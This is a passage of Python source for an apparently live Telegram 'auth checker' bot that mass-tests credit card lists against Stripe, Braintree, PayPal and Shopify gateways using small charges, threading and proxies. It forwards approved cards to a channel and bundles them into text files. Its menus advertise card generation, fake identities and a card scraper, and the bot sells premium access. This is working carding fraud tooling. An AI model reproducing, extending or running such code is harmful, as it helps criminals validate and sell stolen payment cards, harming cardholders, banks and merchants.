    keyboard = InlineKeyboardMarkup()
    
    if session['paused']:
        keyboard.add(
            InlineKeyboardButton("▶️ Resume", callback_data=f"resume_{session['gateway']}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{session['gateway']}")
        )
    else:
        keyboard.add(
            InlineKeyboardButton("⏸️ Pause", callback_data=f"pause_{session['gateway']}"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{session['gateway']}")
        )
    
    return message, keyboard

def get_gateway_display_name(gateway_key):
    """Get display name for gateway"""
    gateway_names = {
        'mch': 'Stripe Auth',
        'mbr': 'Braintree Auth', 
        'mpp': 'PayPal Charge',
        'msh': 'Shopify Charge',
        'mst': 'Stripe Charge',
        'msk': 'Stripe Sk Charge',
        'mvbv': 'Mass VBV Lookup'
    }
    return gateway_names.get(gateway_key, 'Unknown Gateway')

# ---------------- Mass Check with Format Selection ---------------- #

def start_mass_check_with_format_selection(msg, gateway_key, gateway_name, cc_lines, check_function):
    """Start mass check with format selection"""
    user_id = msg.from_user.id
    total = len(cc_lines)
    
    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Create format selection keyboard
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💬 In Message Format", callback_data=f"format_message_{gateway_key}"),
        InlineKeyboardButton("📝 In TXT Format", callback_data=f"format_txt_{gateway_key}")
    )
    
    format_msg = bot.send_message(
        chat_id,
        f"""
🎯 *{gateway_name} Mass Check*

📋 *Cards to check*: {total}
⚡ *Please select output format:*

💬 *Message Format* - Approved cards sent individually as messages
📝 *TXT Format* - Approved cards collected and sent as text file after completion

Choose your preferred format:""",
        parse_mode='Markdown',
        reply_markup=keyboard,
        reply_to_message_id=msg.message_id
    )
    
    # Store the card data temporarily in global dict
    temp_key = f"{user_id}_{gateway_key}"
    TEMP_MASS_DATA[temp_key] = {
        'user_id': user_id,
        'gateway_key': gateway_key,
        'gateway_name': gateway_name,
        'cc_lines': cc_lines,
        'check_function': check_function,
        'format_msg_id': format_msg.message_id,
        'chat_id': chat_id
    }

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    """Handle ALL callback queries in one place"""
    try:
        data = call.data
        user_id = call.from_user.id
        
        print(f"📲 Callback received: {data} from user {user_id}")
        
        if data.startswith('format_'):
            # Handle format selection
            _, output_format, gateway_key = data.split('_', 2)
            temp_key = f"{user_id}_{gateway_key}"
            
            if temp_key not in TEMP_MASS_DATA:
                bot.answer_callback_query(call.id, "❌ Session expired! Please start again.")
                return
            
            temp_data = TEMP_MASS_DATA[temp_key]
            
            # Answer callback immediately
            bot.answer_callback_query(call.id, f"✅ Starting mass check...")
            
            # Delete format selection message
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass
            
            # Start mass check directly
            start_fast_mass_check(temp_data, output_format)
            
            # Clean up temporary data
            if temp_key in TEMP_MASS_DATA:
                del TEMP_MASS_DATA[temp_key]
                
        elif data.startswith('pause_'):
            # Handle pause
            _, gateway = data.split('_', 1)
            session_id, session = get_mass_check_session(user_id, gateway)
            
            if session and pause_mass_check(session_id):
                bot.answer_callback_query(call.id, "⏸️ Mass check paused!")
                gateway_name = get_gateway_display_name(gateway)
                message, keyboard = get_mass_check_stats_message(session, gateway_name)
                bot.edit_message_text(
                    message,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id, "❌ No active session found!")
                
        elif data.startswith('resume_'):
            # Handle resume
            _, gateway = data.split('_', 1)
            session_id, session = get_mass_check_session(user_id, gateway)
            
            if session and resume_mass_check(session_id):
                bot.answer_callback_query(call.id, "▶️ Mass check resumed!")
                gateway_name = get_gateway_display_name(gateway)
                message, keyboard = get_mass_check_stats_message(session, gateway_name)
                bot.edit_message_text(
                    message,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id, "❌ No active session found!")
                
        elif data.startswith('cancel_'):
            # Handle cancel
            _, gateway = data.split('_', 1)
            session_id, session = get_mass_check_session(user_id, gateway)
            
            if session and cancel_mass_check(session_id):
                bot.answer_callback_query(call.id, "❌ Mass check cancelled!")
                try:
                    bot.delete_message(call.message.chat.id, call.message.message_id)
                except:
                    pass
            else:
                bot.answer_callback_query(call.id, "❌ No active session found!")
        
        elif data == 'show_single_check':
            # Show single check gates
            bot.answer_callback_query(call.id, "📋 Single Check Gates")
            message = """
🔹 *SINGLE CHECK GATES* 🔹

• /br - Braintree Auth✅
• /ch - Stripe Auth✅
• /st - Stripe Non-sk Charge 5$✅
• /sk - Stripe Sk-based Charge 1$✅
• /pp - PayPal Charge 2$✅
• /sh - Shopify Charge 13.98$✅
• /vbv - VBV Lookup✅

🔱 *Powered by @mhitzxg*
"""
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu"))
            bot.edit_message_text(message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
        
        elif data == 'show_mass_check':
            # Show mass check gates
            bot.answer_callback_query(call.id, "📋 Mass Check Gates")
            message = """
🔸 *MASS CHECK GATES* 🔸

• /mbr - Mass Braintree Auth✅
• /mch - Mass Stripe Auth✅
• /mst - Stripe Non-sk Mass 5$✅
• /msk - Stripe Sk-based Mass 1$✅
• /mpp - Mass PayPal 2$✅
• /msh - Shopify Mass 13.98$✅
• /mvbv - Mass VBV Lookup✅

🔱 *Powered by @mhitzxg*
"""
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu"))
            bot.edit_message_text(message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
        
        elif data == 'show_tools':
            # Show tools
            bot.answer_callback_query(call.id, "🛠️ Tools")
            message = """
🛠️ *TOOLS* 🛠️

• /url - Gateway Scanner✅
• /gen - Generate Cards 🎰
• /fake - Generate Fake Identity
• /bin - BIN Lookup
• /scr - CC Scraper

🔱 *Powered by @mhitzxg*
"""
            keyboard = InlineKeyboardMarkup()
            keyboard.add(InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu"))
            bot.edit_message_text(message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
        
        elif data == 'back_to_menu':
            # Return to main menu
            bot.answer_callback_query(call.id, "🏠 Main Menu")
            welcome_message = f"""
★ *𝗠𝗛𝗜𝗧𝗭𝗫𝗚  𝗔𝗨𝗧𝗛  𝗖𝗛𝗘𝗖𝗞𝗘𝗥* ★

✨ *𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {call.from_user.first_name or 'User'}!* ✨

📋 *Use the buttons below to navigate*

📌 *𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝘂𝘀*: {check_proxy_status()}

✨ *𝗳𝗼𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗮𝗰𝗰𝗲𝘀𝘀*
📩 *𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @mhitzxg* 
❄️ *𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @mhitzxg & @pr0xy_xd*
"""
            keyboard = InlineKeyboardMarkup(row_width=2)
            keyboard.add(InlineKeyboardButton("🔹 Single Check", callback_data="show_single_check"))
            keyboard.add(InlineKeyboardButton("🔸 Mass Check", callback_data="show_mass_check"))
            keyboard.add(InlineKeyboardButton("🛠️ Tools", callback_data="show_tools"))
            bot.edit_message_text(welcome_message, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=keyboard)
                
    except Exception as e:
        print(f"❌ Callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error processing request!")

def start_fast_mass_check(temp_data, output_format):
    """Start fast mass check - SIMPLIFIED VERSION"""
    try:
        user_id = temp_data['user_id']
        gateway_key = temp_data['gateway_key']
        gateway_name = temp_data['gateway_name']
        cc_lines = temp_data['cc_lines']
        check_function = temp_data['check_function']
        chat_id = temp_data['chat_id']
        total = len(cc_lines)

        # Create initial stats session
        initial_session = {
            'user_id': user_id,
            'gateway': gateway_key,
            'total_cards': total,
            'current_card': 0,
            'approved': 0,
            'declined': 0,
            'message_id': None,
            'paused': False,
            'cancelled': False,
            'start_time': time.time(),
            'chat_id': chat_id,
            'output_format': output_format
        }
        
        # Send initial stats message
        message, keyboard = get_mass_check_stats_message(initial_session, gateway_name)
        stats_msg = bot.send_message(chat_id, message, parse_mode='Markdown', reply_markup=keyboard)
        
        # Create session
        session_id = create_mass_check_session(user_id, gateway_key, total, stats_msg.message_id, output_format)
        MASS_CHECK_SESSIONS[session_id]['chat_id'] = chat_id
        
        # Set mass check as active
        MASS_CHECK_ACTIVE[gateway_key] = True

        # Start processing in background - SIMPLE AND FAST
        thread = threading.Thread(
            target=fast_process_cards,
            args=(user_id, gateway_key, gateway_name, cc_lines, check_function, output_format, chat_id, total, stats_msg.message_id)
        )
        thread.daemon = True
        thread.start()
        
        print(f"🚀 FAST Mass check started for user {user_id} with {gateway_key}, format: {output_format}")
        
    except Exception as e:
        print(f"❌ Error starting mass check: {e}")
        error_msg = f"❌ Error starting mass check: {str(e)}"
        bot.send_message(chat_id, error_msg)

def fast_process_cards(user_id, gateway_key, gateway_name, cc_lines, check_function, output_format, chat_id, total, stats_msg_id):
    """FAST card processing with threading for mbr, mch, and mpp"""
    try:
        approved = 0
        declined = 0
        start_time = time.time()
        approved_cards_list = []
        processed_count = 0
        lock = threading.Lock()  # Thread-safe lock for counters
        
        print(f"⚡ Starting FAST processing of {total} cards...")
        
        # Determine if we should use threading (for mbr, mch, mpp)
        use_threading = gateway_key in ['mbr', 'mch', 'mpp']
        max_workers = 5  # Default 5 threads
        
        def process_single_card(cc_line, card_index):
            """Process a single card - thread-safe"""
            nonlocal approved, declined, processed_count
            
            # Check if cancelled
            session_id, session = get_mass_check_session(user_id, gateway_key)
            if not session or session.get('cancelled'):
                return None
            
            # Handle pause
            if session and session.get('paused'):
                while session and session.get('paused') and not session.get('cancelled'):
                    time.sleep(0.5)
                    session_id, session = get_mass_check_session(user_id, gateway_key)
                    if not session:
                        return None
            
            if not session or session.get('cancelled'):
                return None
            
            try:
                # Special handling for Braintree
                if gateway_key == 'mbr':
                    import asyncio
                    from braintree_checker import check_card_braintree
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    result = loop.run_until_complete(check_card_braintree(cc_line.strip()))
                    loop.close()
                else:
                    result = check_function(cc_line.strip())
                
                # Thread-safe counter updates
                with lock:
                    processed_count += 1
                    current_count = processed_count
                    
                    if "APPROVED" in result:
                        approved += 1
                        # Simple formatting
                        user_info_data = get_user_info(user_id)
                        user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                        proxy_status = check_proxy_status()
                        
                        formatted_result = result.replace(
                            "🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』",
                            f"👤 Checked by: {user_info}\n🔌 Proxy: {proxy_status}\n🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』"
                        )
                        
                        # Store approved card
                        add_approved_card(session_id, formatted_result)
                        approved_cards_list.append(formatted_result)
                        
                        # Send to channel
                        try:
                            notify_channel(formatted_result)
                        except:
                            pass
                        
                        # Send to user based on format
                        if output_format == 'message':
                            approved_msg = f"🎉 *NEW APPROVED CARD* 🎉\n\n{formatted_result}\n\n• *Progress*: {current_count}/{total}\n• *Approved*: {approved} | *Declined*: {declined}"
                            try:
                                send_long_message(chat_id, approved_msg, parse_mode='HTML')
                            except:
                                pass
                    else:
                        declined += 1
                    
                    # Update progress
                    update_mass_check_progress(session_id, current_count, approved, declined)
                    
                    # Update stats message periodically
                    if current_count % 3 == 0 or current_count == total or "APPROVED" in result:
                        session_id, session = get_mass_check_session(user_id, gateway_key)
                        if session and not session.get('cancelled'):
                            message, keyboard = get_mass_check_stats_message(session, gateway_name)
                            try:
                                bot.edit_message_text(
                                    message,
                                    chat_id,
                                    stats_msg_id,
                                    parse_mode='Markdown',
                                    reply_markup=keyboard
                                )
                            except:
                                pass
                
                return result
                
            except Exception as e:
                print(f"❌ Error processing card {card_index}: {e}")
                with lock:
                    processed_count += 1
                    declined += 1
                return None
        
        # Use threading for mbr, mch, mpp
        if use_threading:
            print(f"🚀 Using threading with {max_workers} workers for {gateway_key}")
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Submit all cards for processing
                futures = {executor.submit(process_single_card, cc_line.strip(), i+1): i+1 
                          for i, cc_line in enumerate(cc_lines)}
                
                # Process results as they complete
                for future in futures:
                    # Check for cancellation periodically
                    session_id, session = get_mass_check_session(user_id, gateway_key)
                    if not session or session.get('cancelled'):
                        # Cancel remaining futures
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        future.result(timeout=60)  # 60 second timeout per card
                    except Exception as e:
                        print(f"❌ Thread error: {e}")
        else:
            # Sequential processing for other gateways
            for i, cc_line in enumerate(cc_lines, 1):
                session_id, session = get_mass_check_session(user_id, gateway_key)
                if not session or session.get('cancelled'):
                    break
                
                if session and session.get('paused'):
                    while session and session.get('paused') and not session.get('cancelled'):
                        time.sleep(0.5)
                        session_id, session = get_mass_check_session(user_id, gateway_key)
                        if not session:
                            break
                
                if not session or session.get('cancelled'):
                    break
                
                process_single_card(cc_line.strip(), i)
                
                # Small sleep for non-threaded gateways
                if i % 5 == 0:
                    time.sleep(0.1)
        
        # Final cleanup
        MASS_CHECK_ACTIVE[gateway_key] = False
        
        # Update stats
        update_stats(approved=approved, declined=declined)
        for _ in range(approved):
            update_user_stats(user_id, approved=True)
        for _ in range(declined):
            update_user_stats(user_id, approved=False)
        
        # Delete stats message
        try:
            bot.delete_message(chat_id, stats_msg_id)
        except:
            pass
        
        # Send final results - FAST AND SIMPLE
        total_time = time.time() - start_time
        
        final_message = f"""
✅ *Mass Check Completed* ✅

📊 *Final Results*
• ✅ *Approved*: {approved}
• ❌ *Declined*: {declined}
• 📋 *Total*: {total}
• ⏰ *Time*: {total_time:.2f}s
• 🚀 *Speed*: {total/total_time:.2f} cards/sec

🎯 *Gateway*: {gateway_name}
📤 *Output Format*: {'💬 Message' if output_format == 'message' else '📝 TXT File'}
⚡ *Processing complete!*

👤 *Checked by*: {get_user_info(user_id)['username']}
🔌 *Proxy*: {check_proxy_status()}
"""
        
        if approved > 0 and output_format == 'txt':
            # FIXED: Use clean formatting for text file while preserving original structure
            clean_approved_cards = []
            for card in approved_cards_list:
                # Clean the card text while keeping the original format
                clean_card = clean_card_preserve_format(card)
                clean_approved_cards.append(clean_card)
            
            # Create clean file content with proper formatting
            header = f"""
══════════════════════════════════════════════════
              APPROVED CARDS COLLECTION
              Gateway: {gateway_name}
              Total Approved: {approved}
              Checked by: {get_user_info(user_id)['username']}
              Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
══════════════════════════════════════════════════

"""
            file_content = header + "\n\n".join(clean_approved_cards)
            
            file_buffer = io.BytesIO(file_content.encode('utf-8'))
            file_buffer.name = f'approved_cards_{gateway_key}_{int(time.time())}.txt'
            
            try:
                bot.send_document(
                    chat_id, 
                    file_buffer, 
                    caption=final_message, 
                    parse_mode='Markdown'
                )
            except Exception as e:
                print(f"Error sending file: {e}")
                send_long_message(chat_id, final_message + "\n📁 *Failed to send file*", parse_mode='Markdown')
        else:
            if approved > 0:
                final_message += f"\n🎉 *Found {approved} approved cards*"
            else:
                final_message += f"\n😔 *No approved cards found*"
            try:
                send_long_message(chat_id, final_message, parse_mode='Markdown')
            except:
                pass
            
        print(f"✅ Mass check completed: {approved} approved, {declined} declined, {total_time:.2f}s")
            
    except Exception as e:
        print(f"❌ Mass check processing error: {e}")
        error_msg = f"❌ Mass check error: {str(e)}"
        try:
            bot.send_message(chat_id, error_msg)
        except:
            pass

def clean_card_preserve_format(card_text):
    """Clean card text while preserving the original format structure"""
    try:
        # Extract all the key information using regex patterns that match the actual format
        lines = card_text.split('\n')
        cleaned_lines = []
        
        for line in lines:
            # Clean each line while preserving the structure
            cleaned_line = line
            
            # Replace problematic Unicode characters but keep the structure
            replacements = {
                "⇾": "->",
                "『": "[",
                "』": "]",
                "帝": "-",
                "𝗖𝗖": "CC",
                "𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲": "Response", 
                "𝗚𝗮𝘁𝗲𝘄𝗮𝘆": "Gateway",
                "𝗕𝗜𝗡 𝗜𝗻𝗳𝗼": "BIN Info",
                "𝗕𝗮𝗻𝗸": "Bank",
                "𝗖𝗼𝘂𝗻𝘁𝗿𝘆": "Country",
                "𝗧𝗼𝗼𝗸": "Time Taken"
            }
            
            for old, new in replacements.items():
                cleaned_line = cleaned_line.replace(old, new)
            
            # Remove any remaining problematic characters but keep emojis and basic structure
            cleaned_line = re.sub(r'[^\x00-\x7F\u00A0-\uD7FF\uE000-\uFFFF]', '', cleaned_line)
            
            if cleaned_line.strip():
                cleaned_lines.append(cleaned_line)
        
        # Rebuild the card with proper formatting
        if cleaned_lines:
            return "\n".join(cleaned_lines)
        else:
            return card_text
            
    except Exception as e:
        print(f"Error in clean_card_preserve_format: {e}")
        # Fallback: return original text with basic cleaning
        return re.sub(r'[^\x00-\x7F]+', ' ', card_text)

def extract_card_info_properly(card_text):
    """Extract card information properly while keeping the original format"""
    try:
        # Parse the card text line by line to understand the structure
        lines = card_text.split('\n')
        result_lines = []
        
        for line in lines:
            if "APPROVED CC" in line:
                result_lines.append("APPROVED CC ✅")
            elif "💳" in line or "CC" in line:
                # Extract CC line
                cc_match = re.search(r'(\d{16}\|\d{2}\|\d{4}\|\d{3,4})', line)
                if cc_match:
                    result_lines.append(f"💳 CC -> {cc_match.group(1)}")
            elif "🚀" in line or "Response" in line:
                # Extract response
                response_match = re.search(r'Response.*?->\s*(.+)', line.replace("⇾", "->"))
                if response_match:
                    result_lines.append(f"🚀 Response -> {response_match.group(1).strip()}")
                else:
                    result_lines.append("🚀 Response -> Payment method successfully added.")
            elif "💰" in line or "Gateway" in line:
                # Extract gateway
                gateway_match = re.search(r'Gateway.*?->\s*(.+)', line.replace("⇾", "->"))
                if gateway_match:
                    result_lines.append(f"💰 Gateway -> {gateway_match.group(1).strip()}")
                else:
                    result_lines.append(f"💰 Gateway -> {gateway_key.replace('m', '').upper()} Auth")
            elif "📚" in line or "BIN Info" in line:
                # Extract BIN info
                bin_match = re.search(r'BIN Info.*?:\s*(.+)', line)
                if bin_match:
                    result_lines.append(f"📚 BIN Info: {bin_match.group(1).strip()}")
            elif "🏛️" in line or "Bank" in line:
                # Extract bank
                bank_match = re.search(r'Bank.*?:\s*(.+)', line)
                if bank_match:
                    result_lines.append(f"🏛️ Bank: {bank_match.group(1).strip()}")
            elif "🌎" in line or "Country" in line:
                # Extract country
                country_match = re.search(r'Country.*?:\s*(.+)', line)
                if country_match:
                    result_lines.append(f"🌎 Country: {country_match.group(1).strip()}")
            elif "🕒" in line or "Time Taken" in line:
                # Extract time
                time_match = re.search(r'Time Taken.*?:\s*(.+)', line)
                if time_match:
                    result_lines.append(f"🕒 Time Taken: {time_match.group(1).strip()}")
            elif "👤" in line or "Checked by" in line:
                # Extract checked by info
                checked_match = re.search(r'Checked by.*?:\s*(.+)', line)
                if checked_match:
                    result_lines.append(f"👤 Checked by: {checked_match.group(1).strip()}")
            elif "🔌" in line or "Proxy" in line:
                # Extract proxy info
                proxy_match = re.search(r'Proxy.*?:\s*(.+)', line)
                if proxy_match:
                    result_lines.append(f"🔌 Proxy: {proxy_match.group(1).strip()}")
            elif "🔱" in line or "Bot by" in line:
                result_lines.append("🔱 Bot by: [@mhitzxg - @pr0xy_xd]")
            elif line.strip() and not any(x in line for x in ["Progress", "Approved", "Declined"]):
                # Keep other relevant lines
                result_lines.append(line.strip())
        
        # Add separator between cards
        if result_lines:
            result_lines.append("")  # Empty line between cards
            result_lines.append("─" * 50)  # Separator line
            result_lines.append("")  # Empty line after separator
        
        return "\n".join(result_lines)
        
    except Exception as e:
        print(f"Error extracting card info: {e}")
        return clean_card_preserve_format(card_text)

# ---------------- Stop Commands ---------------- #

@bot.message_handler(commands=['stopch', 'stopbr', 'stoppp', 'stopsh', 'stopst'])
def stop_mass_check(msg):
    """Stop mass checking for all gateways"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can stop mass checks

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    command = msg.text.split('@')[0].lower()
    
    stop_commands = {
        '/stopch': 'mch',
        '/stopbr': 'mbr', 
        '/stoppp': 'mpp',
        '/stopsh': 'msh',
        '/stopst': 'mst'
    }
    
    gateway_name = {
        'mch': 'Stripe Auth',
        'mbr': 'Braintree Auth',
        'mpp': 'PayPal Charge', 
        'msh': 'Shopify Charge',
        'mst': 'Stripe Charge',
        'msk': 'Stripe Sk Charge',
        'mvbv': 'Mass VBV Lookup'
    }
    
    gateway_key = stop_commands.get(command)
    
    if gateway_key:
        MASS_CHECK_ACTIVE[gateway_key] = False
        # Also cancel any active session
        session_id, session = get_mass_check_session(msg.from_user.id, gateway_key)
        if session:
            cancel_mass_check(session_id)
        
        send_long_message(msg.chat.id, f"""
🎯 *Mass Check Stopped* 🎯

• *Gateway*: {gateway_name[gateway_key]}
• *Status*: Stopped ✅
• All ongoing checks have been terminated

• You can start a new mass check anytime""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    else:
        send_long_message(msg.chat.id, """
❌ *Invalid Command* ❌

• Available stop commands:
• /stopch - Stop Stripe Auth
• /stopbr - Stop Braintree Auth  
• /stoppp - Stop PayPal Charge
• /stopsh - Stop Shopify Charge
• /stopst - Stop Stripe Charge""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

# ---------------- Status Command ---------------- #

@bot.message_handler(commands=['status'])
def status_command(msg):
    """Show bot statistics and status"""
    if not is_authorized(msg):
        return send_long_message(msg.chat.id, """
  
🔰 *AUTHORIZATION REQUIRED* 🔰         

• You are not authorized to use this command
• Only authorized users can view status

• Use /register to get access
• Or contact an admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Get statistics from database
    stats = get_stats_from_db()
    
    if not stats:
        return send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Cannot retrieve statistics from database
• Please try again later""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

    # Calculate approval rates
    total_approval_rate = (stats['total_approved'] / stats['total_cards'] * 100) if stats['total_cards'] > 0 else 0
    today_approval_rate = (stats['today_approved'] / stats['today_cards'] * 100) if stats['today_cards'] > 0 else 0
    
    # Get proxy status
    proxy_status = check_proxy_status()
    
    # Get current time
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    status_message = f"""
🤖 *Bot Information*
• *Bot Name*: MHITZXG AUTH CHECKER
• *Status*: Online ✅
• *Proxy*: {proxy_status}
• *Last Update*: {current_time}

📈 *Overall Statistics*
• *Total Cards Checked*: {stats['total_cards']}
• *Approved Cards*: {stats['total_approved']} ✅
• *Declined Cards*: {stats['total_declined']} ❌
• *Approval Rate*: {total_approval_rate:.2f}%

📅 *Today's Statistics*
• *Cards Checked*: {stats['today_cards']}
• *Approved*: {stats['today_approved']} ✅
• *Declined*: {stats['today_declined']} ❌
• *Approval Rate*: {today_approval_rate:.2f}%

👥 *User Information*
• *Total Users*: {stats['total_users']}
• *Free Users*: {stats['total_users'] - len(load_admins())} 🔓
• *Premium Users*: {len(load_admins())} 💰

⚡ *System Status*
• *Database*: Connected ✅
• *API*: Operational ✅
• *Gateway*: Active ✅

🔱 *Powered by*: @mhitzxg & @pr0xy_xd
"""

    send_long_message(msg.chat.id, status_message, reply_to_message_id=msg.message_id, parse_mode='Markdown')

# ---------------- Admin Commands ---------------- #
@bot.message_handler(commands=['broadcast'])
def broadcast_message(msg):
    """Send message to all users (admins only)"""
    if not is_admin(msg.from_user.id):
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only admins can broadcast messages
• Contact an admin for assistance""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    conn = None
    try:
        # Check if message is provided
        if not msg.reply_to_message:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Please reply to a message with /broadcast
• The replied message will be sent to all users

• Example: Reply to any message with /broadcast""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        # Get the message to broadcast
        broadcast_msg = msg.reply_to_message
        
        # Get all users from database
        conn = connect_db()
        if not conn:
            return send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Cannot connect to database
• Please try again later""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
            
        cursor = conn.cursor()
        
        # Get all free users
        cursor.execute("SELECT user_id FROM free_users")
        free_users = [row[0] for row in cursor.fetchall()]
        
        # Get all premium users
        cursor.execute("SELECT user_id FROM premium_users WHERE subscription_expiry > NOW()")
        premium_users = [row[0] for row in cursor.fetchall()]
        
        # Combine all users (remove duplicates)
        all_users = list(set(free_users + premium_users))
        
        if not all_users:
            return send_long_message(msg.chat.id, """
❌ *No Users Found* ❌

• There are no users to broadcast to
• The user database is empty""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        # Send initial status
        status_msg = send_long_message(msg.chat.id, f"""
📢 *Starting Broadcast* 📢

• Total users: {len(all_users)}
• Message type: {broadcast_msg.content_type}
• Status: Sending... ⏳

0/{len(all_users)} sent
0% complete""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        if isinstance(status_msg, list) and len(status_msg) > 0:
            status_msg = status_msg[0]
        
        # Broadcast to all users
        successful = 0
        failed = 0
        
        for i, user_id in enumerate(all_users, 1):
            try:
                # Forward the message to user
                if broadcast_msg.content_type == 'text':
                    send_long_message(user_id, broadcast_msg.text, parse_mode='Markdown')
                elif broadcast_msg.content_type == 'photo':
                    bot.send_photo(user_id, broadcast_msg.photo[-1].file_id, caption=broadcast_msg.caption)
                elif broadcast_msg.content_type == 'document':
                    bot.send_document(user_id, broadcast_msg.document.file_id, caption=broadcast_msg.caption)
                elif broadcast_msg.content_type == 'video':
                    bot.send_video(user_id, broadcast_msg.video.file_id, caption=broadcast_msg.caption)
                else:
                    # For other types, send as text if possible
                    if broadcast_msg.text:
                        send_long_message(user_id, broadcast_msg.text, parse_mode='Markdown')
                    else:
                        bot.forward_message(user_id, broadcast_msg.chat.id, broadcast_msg.message_id)
                
                successful += 1
                
            except Exception as e:
                print(f"Failed to send to user {user_id}: {e}")
                failed += 1
            
            # Update status every 10 messages or at the end
            if i % 10 == 0 or i == len(all_users):
                progress = (i / len(all_users)) * 100
                try:
                    edit_long_message(msg.chat.id, status_msg.message_id, f"""
📢 *Broadcast in Progress* 📢

• Total users: {len(all_users)}
• Message type: {broadcast_msg.content_type}
• Status: Sending... ⏳

{i}/{len(all_users)} sent ({successful} ✅, {failed} ❌)
{progress:.1f}% complete""", parse_mode='Markdown')
                except:
                    pass
            
            # Small delay to avoid rate limits
            time.sleep(0.1)
        
        # Send final results
        final_message = f"""
✅ *Broadcast Completed* ✅

📊 *Results*:
• Total users: {len(all_users)}
• Successful: {successful} ✅
• Failed: {failed} ❌
• Success rate: {(successful/len(all_users))*100:.1f}%

⏰ *Completed at*: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

📢 *Message sent to all users successfully!*"""
        
        try:
            edit_long_message(msg.chat.id, status_msg.message_id, final_message, parse_mode='Markdown')
        except:
            send_long_message(msg.chat.id, final_message, parse_mode='Markdown')
        
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Broadcast Error* ⚠️

• Error: {str(e)}
• Please try again later""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    finally:
        if conn and conn.is_connected():
            conn.close()

@bot.message_handler(commands=['addadmin'])
def add_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only the main admin can add other admins
• Contact the main admin: @mhitzxg""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            return send_long_message(msg.chat.id, """
⚡ *Invalid Usage* ⚡

• Usage: `/addadmin <user_id>`
• Example: `/addadmin 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        user_id = int(parts[1])
        admins = load_admins()
        
        if user_id in admins:
            return send_long_message(msg.chat.id, """
❌ *Already Admin* ❌

• This user is already an admin""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
        admins.append(user_id)
        if save_admins(admins):
            send_long_message(msg.chat.id, f"""
✅ *Admin Added* ✅

• Successfully added `{user_id}` as admin
• Total admins: {len(admins)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        else:
            send_long_message(msg.chat.id, """
⚠️ *Database Error* ⚠️

• Failed to save admin to database""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
        
    except ValueError:
        send_long_message(msg.chat.id, """
❌ *Invalid User ID* ❌

• Please provide a valid numeric user ID
• Usage: `/addadmin 1234567890`""", reply_to_message_id=msg.message_id, parse_mode='Markdown')
    except Exception as e:
        send_long_message(msg.chat.id, f"""
⚠️ *Error* ⚠️

• Error: {str(e)}""", reply_to_message_id=msg.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['removeadmin'])
def remove_admin(msg):
    if msg.from_user.id != MAIN_ADMIN_ID:
        return send_long_message(msg.chat.id, """
🔰 *Admin Permission Required* 🔰

• Only the main admin can remove other admins
